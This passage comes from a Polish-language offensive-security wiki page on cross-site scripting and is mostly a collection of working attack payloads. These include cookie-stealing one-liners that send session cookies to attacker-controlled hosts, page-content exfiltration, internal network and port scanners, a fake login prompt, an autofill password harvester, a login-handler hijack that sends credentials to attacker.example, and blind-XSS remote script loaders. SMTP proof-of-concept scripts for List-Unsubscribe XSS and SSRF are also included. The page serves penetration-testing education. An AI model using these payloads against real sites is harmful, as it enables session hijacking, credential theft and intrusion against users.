((ﾟωﾟﾉ == 3) + "_")[ﾟｰﾟ] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ - ﾟΘﾟ] +
ﾟДﾟ["c"] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
ﾟДﾟ["o"] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ]
ﾟДﾟ["_"] = (o ^ _ ^ o)[ﾟoﾟ][ﾟoﾟ]
ﾟεﾟ =
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
ﾟДﾟ.ﾟДﾟﾉ +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[o ^ _ ^ (o - ﾟΘﾟ)] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ]
ﾟｰﾟ += ﾟΘﾟ
ﾟДﾟ[ﾟεﾟ] = "\\"
ﾟДﾟ.ﾟΘﾟﾉ = (ﾟДﾟ + ﾟｰﾟ)[o ^ _ ^ (o - ﾟΘﾟ)]
oﾟｰﾟo = (ﾟωﾟﾉ + "_")[c ^ _ ^ o]
ﾟДﾟ[ﾟoﾟ] = '"'
ﾟДﾟ["_"](
ﾟДﾟ["_"](
ﾟεﾟ +
ﾟДﾟ[ﾟoﾟ] +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
(ﾟｰﾟ + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟoﾟ]
)(ﾟΘﾟ)
)("_")
```

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
## Typowe payloads XSS

### Kilka payloads w 1


{{#ref}}
steal-info-js.md
{{#endref}}

### Iframe Trap

Zmusić użytkownika do poruszania się po stronie bez wychodzenia z iframe i przechwycić jego działania (w tym informacje wysyłane w formularzach):


{{#ref}}
../iframe-traps.md
{{#endref}}

### Pobierz Cookies
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
> [!TIP]
> Nie **będziesz w stanie uzyskać dostępu do cookies z JavaScriptu** jeśli flaga HTTPOnly jest ustawiona w cookie. Ale tutaj masz [some ways to bypass this protection](../hacking-with-cookies/index.html#httponly) jeśli będziesz miał wystarczające szczęście.

### Wykradanie zawartości strony
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8"
var attacker = "http://10.10.14.8/exfil"
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open("GET", url, true)
xhr.send(null)
```
### Znajdź wewnętrzne adresy IP
```html
<script>
var q = []
var collaboratorURL =
"http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net"
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for (i = 1; i <= 255; i++) {
q.push(
(function (url) {
return function () {
fetchUrl(url, wait)
}
})("http://192.168.0." + i + ":8080")
)
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for (i = 1; i <= n_threads; i++) {
if (q.length) q.shift()()
}

function fetchUrl(url, wait) {
console.log(url)
var controller = new AbortController(),
signal = controller.signal
fetch(url, { signal })
.then((r) =>
r.text().then((text) => {
location =
collaboratorURL +
"?ip=" +
url.replace(/^http:\/\//, "") +
"&code=" +
encodeURIComponent(text) +
"&" +
Date.now()
})
)
.catch((e) => {
if (!String(e).includes("The user aborted a request") && q.length) {
q.shift()()
}
})

setTimeout((x) => {
controller.abort()
if (q.length) {
q.shift()()
}
}, wait)
}
</script>
```
### Port Scanner (fetch)
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### Port Scanner (websockets)
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_Krótsze czasy oznaczają port, który odpowiada_ _Dłuższe czasy oznaczają brak odpowiedzi._

Przejrzyj listę portów zablokowanych w Chrome [**here**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net_util.cc) i w Firefox [**here**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist).

### Okienko proszące o dane logowania
```html
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### Przechwytywanie haseł z autouzupełniania
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
Gdy w polu hasła wprowadzone zostaną jakiekolwiek dane, username i password są wysyłane na serwer atakującego — nawet jeśli klient wybierze zapisane hasło i nic nie wpisze, poświadczenia zostaną ex-filtrated.

### Hijack form handlers to exfiltrate credentials (const shadowing)

Jeśli krytyczny handler (np. `function DoLogin(){...}`) jest zadeklarowany później na stronie, a twój payload uruchamia się wcześniej (np. via an inline JS-in-JS sink), zdefiniuj najpierw `const` o tej samej nazwie, aby preempt i zablokować handler. Późniejsze deklaracje funkcji nie mogą rebind a `const` name, zostawiając twój hook pod kontrolą:
```javascript
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value);
const user = Trim(FormInput.InputUtente.value);
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));
};
```
Notatki
- To zależy od kolejności wykonania: twoje wstrzyknięcie musi wykonać się przed prawidłową deklaracją.
- Jeśli twój payload jest opakowany w `eval(...)`, wiązania `const/let` nie staną się globalne. Użyj dynamicznej techniki wstrzykiwania `<script>` z sekcji “Deliverable payloads with eval(atob()) and scope nuances”, aby zapewnić prawdziwe globalne, niepodlegające ponownemu przypisaniu wiązanie.
- Gdy filtry słów kluczowych blokują kod, łącz to z identyfikatorami Unicode-escaped lub dostarczeniem przez `eval(atob('...'))`, jak pokazano powyżej.

### Keylogger

Just searching in github I found a few different ones:

- [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
- [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
- [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
- You can also use metasploit `http_javascript_keylogger`

### Kradzież tokenów CSRF
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### Kradzież wiadomości PostMessage
```html
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### PostMessage-origin script loaders (opener-gated)

Jeśli strona **zapisuje `event.origin` z `postMessage` i później dokleja je do URL skryptu**, nadawca kontroluje **origin** ładowanego JS:
```javascript
window.addEventListener('message', (event) => {
if (event.data.msg_type === 'IWL_BOOTSTRAP') {
localStorage.setItem('CFG', {host: event.origin, pixelID: event.data.pixel_id});
startIWL(); // later loads `${host}/sdk/${pixelID}/iwl.js`
}
});
```
Przepis eksploatacji (from CAPIG):

- **Gates**: odpala się tylko gdy `window.opener` istnieje i `pixel_id` jest na liście dozwolonych; **origin is never checked**.
- **Use CSP-allowed origin**: przemieść się na domenę już dozwoloną przez CSP ofiary (np. strony pomocy dla niezalogowanych pozwalające na analytics jak `*.THIRD-PARTY.com`) i hostuj `/sdk/<pixel_id>/iwl.js` tam poprzez takeover/XSS/upload.
- **Restore `opener`**: w Android WebView, `window.name='x'; window.open(target,'x')` sprawia, że strona staje się swoim własnym openerem; wyślij z przechwyconego iframe złośliwy `postMessage`.
- **Trigger**: iframe wysyła `{msg_type:'IWL_BOOTSTRAP', pixel_id:<allowed>}`; parent wtedy ładuje attacker `iwl.js` z CSP-allowed origin i uruchamia go.

To przekształca walidację `postMessage` bez originu w **remote script loader primitive**, które przetrwa CSP, jeśli uda Ci się wylądować na dowolnym originie już dozwolonym przez politykę.

### Supply-chain stored XSS via backend JS concatenation

Kiedy backend **buduje shared SDK przez konkatenację łańcuchów JS z wartościami kontrolowanymi przez użytkownika**, każdy breaker cytatu/struktury może wstrzyknąć skrypt, który jest serwowany wszystkim konsumentom:

- Przykładowy wzorzec (Meta CAPIG): serwer dopisuje `cbq.config.set("<pixel>","IWLParameters",{params: <user JSON>});` bezpośrednio do `capig-events.js`.
- Wstrzyknięcie `'` lub `"]}` zamyka literal/obiekt i dodaje attacker JS, tworząc **stored XSS** w dystrybuowanym SDK dla każdej strony, która go ładuje (first-party and third-party).

### Stored XSS in generated reports when escaping is disabled

Jeśli przesłane pliki są parsowane, a ich metadata jest wypisywana w raportach HTML z wyłączonym escapingiem (`|safe`, custom renderers), ta metadata jest **stored XSS sink**. Przykładowy przebieg:
```python
xmlhost = data.getAttribute(f'{ns}:host')
ret_list.append(('dialer_code_found', (xmlhost,), ()))
'title': a_template['title'] % t_name  # %s fed by xmlhost
```
Szablon Django renderuje `{{item|key:"title"|safe}}`, więc HTML atakującego zostanie wykonany.

**Exploit:** umieść **HTML zakodowany jako encje** w dowolnym polu manifest/config, które trafia do raportu:
```xml
<data android:scheme="android_secret_code"
android:host="&lt;img src=x onerror=alert(document.domain)&gt;"/>
```
Renderowane z `|safe`, raport wypisuje `<img ...>` i uruchamia JS przy wyświetleniu.

**Hunting:** szukaj generatorów raportów/powiadomień, które ponownie używają parsowanych pól w `%s`/f-strings i wyłączają auto-escape. Jeden zakodowany tag w przesłanym manifeście/logu/archiwum powoduje, że XSS utrzymuje się dla każdego oglądającego.

### Wykorzystywanie Service Workers


{{#ref}}
abusing-service-workers.md
{{#endref}}

### Dostęp do Shadow DOM


{{#ref}}
shadow-dom.md
{{#endref}}

### Polyglots


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt
{{#endref}}

### Blind XSS payloads

Możesz też użyć: [https://xsshunter.com/](https://xsshunter.com)
```html
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>

<!-- Payloads from https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide -->
<!-- Image tag -->
'"><img src="x" onerror="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- Input tag with autofocus -->
'"><input autofocus onfocus="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- In case jQuery is loaded, we can make use of the getScript method -->
'"><script>$.getScript("{SERVER}/script.js")</script>

<!-- Make use of the JavaScript protocol (applicable in cases where your input lands into the "href" attribute or a specific DOM sink) -->
javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw=="))

<!-- Render an iframe to validate your injection point and receive a callback -->
'"><iframe src="{SERVER}"></iframe>

<!-- Bypass certain Content Security Policy (CSP) restrictions with a base tag -->
<base href="{SERVER}" />

<!-- Make use of the meta-tag to initiate a redirect -->
<meta http-equiv="refresh" content="0; url={SERVER}" />

<!-- In case your target makes use of AngularJS -->
{{constructor.constructor("import('{SERVER}/script.js')")()}}
```
### Regex - Dostęp do ukrytej zawartości

Z [**this writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay) można się dowiedzieć, że nawet jeśli niektóre wartości znikają z JS, wciąż można je znaleźć w atrybutach JS w różnych obiektach. Na przykład pole input REGEX nadal można odnaleźć nawet po usunięciu wartości tego pola:
```javascript
// Do regex with flag
flag = "CTF{FLAG}"
re = /./g
re.test(flag)

// Remove flag value, nobody will be able to get it, right?
flag = ""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(
document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"]
)
```
### Brute-Force Lista


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt
{{#endref}}

## XSS — wykorzystywanie innych podatności

### XSS w Markdown

Czy można wstrzyknąć kod Markdown, który zostanie wyrenderowany? Może uda Ci się uzyskać XSS! Sprawdź:


{{#ref}}
xss-in-markdown.md
{{#endref}}

### XSS do SSRF

Masz XSS na **stronie korzystającej z cache'owania**? Spróbuj **eskalować to do SSRF** przez Edge Side Include Injection za pomocą tego payloadu:
```python
<esi:include src="http://yoursite.com/capture" />
```
Użyj tego do obejścia ograniczeń cookie, filtrów XSS i wielu innych zastosowań!\
Więcej informacji o tej technice tutaj: [**XSLT**](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md).

### XSS w dynamicznie tworzonym pliku PDF

Jeśli strona generuje PDF używając danych kontrolowanych przez użytkownika, możesz spróbować **oszukać bota**, który tworzy PDF, aby **wykonał dowolny kod JS**.\
Jeśli **bot tworzący PDF znajdzie** jakieś znaczniki **HTML**, będzie je **interpretował**, i możesz to **nadużyć**, by spowodować **Server XSS**.


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}

Jeśli nie możesz wstrzyknąć znaczników HTML, warto spróbować **wstrzyknąć dane PDF**:


{{#ref}}
pdf-injection.md
{{#endref}}

### XSS w Amp4Email

AMP, mające na celu przyspieszenie wydajności stron na urządzeniach mobilnych, wykorzystuje znaczniki HTML uzupełnione JavaScript, aby zapewnić funkcjonalność z naciskiem na szybkość i bezpieczeństwo. Obsługuje szereg komponentów dla różnych funkcji, dostępnych przez [AMP components](https://amp.dev/documentation/components/?format=websites).

Format [**AMP for Email**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/) rozszerza wybrane komponenty AMP na e-maile, pozwalając odbiorcom na interakcję z treścią bezpośrednio w wiadomościach.

Przykład: [**writeup XSS in Amp4Email in Gmail**](https://adico.me/post/xss-in-gmail-s-amp4email).

### List-Unsubscribe Header Abuse (Webmail XSS & SSRF)

Nagłówek RFC 2369 `List-Unsubscribe` osadza URI kontrolowane przez atakującego, które wiele klientów webmail i mail automatycznie konwertuje na przyciski "Unsubscribe". Gdy te URI są renderowane lub pobierane bez walidacji, nagłówek staje się punktem wstrzyknięcia zarówno dla stored XSS (jeśli link unsubscribe umieszczony jest w DOM), jak i SSRF (jeśli serwer wykonuje żądanie unsubscribe w imieniu użytkownika).

#### Stored XSS poprzez URI `javascript:`

1. **Wyślij sobie e-mail**, w którym nagłówek wskazuje na URI `javascript:`, przy tym reszta wiadomości powinna być nieszkodliwa, aby filtry antyspamowe jej nie odrzuciły.
2. **Upewnij się, że UI renderuje tę wartość** (wielu klientów pokazuje ją w panelu "List Info") i sprawdź, czy wynikowy `<a>` dziedziczy atrybuty kontrolowane przez atakującego, takie jak `href` czy `target`.
3. **Wywołaj wykonanie** (np. CTRL+click, kliknięcie środkowym przyciskiem myszy lub "open in new tab") gdy link ma `target="_blank"`; przeglądarki ocenią dostarczony JavaScript w origin aplikacji webmail.
4. Zaobserwuj prymityw stored-XSS: payload utrzymuje się w wiadomości e-mail i wymaga jedynie kliknięcia, aby się wykonać.
```text
List-Unsubscribe: <javascript://attacker.tld/%0aconfirm(document.domain)>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
Bajt nowej linii (`%0a`) w URI pokazuje, że nawet nietypowe znaki przetrwają pipeline renderowania w podatnych klientach, takich jak Horde IMP H5, które wypiszą ciąg dosłownie wewnątrz znacznika <a>.

<details>
<summary>Minimalny SMTP PoC, który dostarcza złośliwy nagłówek List-Unsubscribe</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
sender = "list@example.org"
recipient = "victim@example.org"

msg = EmailMessage()
msg.set_content("Testing List-Unsubscribe rendering")
msg["From"] = sender
msg["To"] = recipient
msg["Subject"] = "Newsletter"
msg["List-Unsubscribe"] = "<javascript://evil.tld/%0aconfirm(document.domain)>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

#### Server-side unsubscribe proxies -> SSRF

Niektóre klienty, takie jak Nextcloud Mail app, przekazują akcję anulowania subskrypcji do obsługi po stronie serwera: kliknięcie przycisku powoduje, że serwer sam pobiera podany URL. To zamienia nagłówek w prymityw SSRF, szczególnie gdy administratorzy ustawiają `'allow_local_remote_servers' => true` (documented in [HackerOne report 2902856](https://hackerone.com/reports/2902856)), co pozwala na żądania do loopback i zakresów RFC1918.

1. **Sporządź e-mail** w którym `List-Unsubscribe` wskazuje endpoint kontrolowany przez atakującego (do blind SSRF użyj Burp Collaborator / OAST).
2. **Zachowaj `List-Unsubscribe-Post: List-Unsubscribe=One-Click`** aby UI wyświetlał przycisk anulowania subskrypcji jednym kliknięciem.
3. **Spełnij wymagania zaufania**: Nextcloud, na przykład, wykonuje żądania HTTPS dla anulowania subskrypcji tylko jeśli wiadomość przejdzie DKIM, więc atakujący musi podpisać e-mail używając domeny, którą kontroluje.
4. **Dostarcz wiadomość do skrzynki** obsługiwanej przez docelowy serwer i poczekaj, aż użytkownik kliknie przycisk anulowania subskrypcji.
5. **Obserwuj callback po stronie serwera** na collaborator endpoint, a następnie pivotuj do adresów wewnętrznych, gdy prymityw zostanie potwierdzony.
```text
List-Unsubscribe: <http://abcdef.oastify.com>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
<details>
<summary>DKIM-signed List-Unsubscribe wiadomość do testowania SSRF</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage
import dkim

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
dkim_selector = "default"
dkim_domain = "example.org"
dkim_private_key = """-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----"""

msg = EmailMessage()
msg.set_content("One-click unsubscribe test")
msg["From"] = "list@example.org"
msg["To"] = "victim@example.org"
msg["Subject"] = "Mailing list"
msg["List-Unsubscribe"] = "<http://abcdef.oastify.com>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

raw = msg.as_bytes()
signature = dkim.sign(
message=raw,
selector=dkim_selector.encode(),
domain=dkim_domain.encode(),
privkey=dkim_private_key.encode(),
include_headers=["From", "To", "Subject"]
)
msg["DKIM-Signature"] = signature.decode().split(": ", 1)[1].replace("\r", "").replace("\n", "")

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

**Uwagi testowe**

- Użyj endpointu OAST, aby zbierać blind SSRF hits, a następnie dostosuj URL `List-Unsubscribe`, aby celował w `http://127.0.0.1:PORT`, metadata services lub inne hosty wewnętrzne po potwierdzeniu prymitywu.
- Ponieważ unsubscribe helper często ponownie używa tego samego stosu HTTP co aplikacja, odziedziczysz jej ustawienia proxy, HTTP verbs i header rewrites, co umożliwia dalsze traversal tricks opisane w [SSRF methodology](../ssrf-server-side-request-forgery/README.md).

### XSS uploading files (svg)

Prześlij jako obraz plik podobny do poniższego (z [http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)):
```html
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```html
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```html
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
